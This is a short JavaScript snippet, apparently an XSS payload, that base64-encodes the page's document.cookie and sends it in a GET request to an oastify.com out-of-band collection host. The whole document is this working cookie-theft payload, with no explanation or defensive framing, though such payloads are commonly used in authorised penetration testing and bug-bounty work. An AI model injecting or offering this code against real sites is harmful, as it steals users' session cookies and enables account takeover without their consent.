let b = btoa(document.cookie)

fetch('https://3bfo1lnjzljn5qgafs3mbmfvmmsdg34s.oastify.com/aa?cookies='.concat(b), {
    method: 'GET', 
    credentials: 'include', 
    headers: {
      'Content-Type': 'application/json'
    }
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error('Erro:', error));
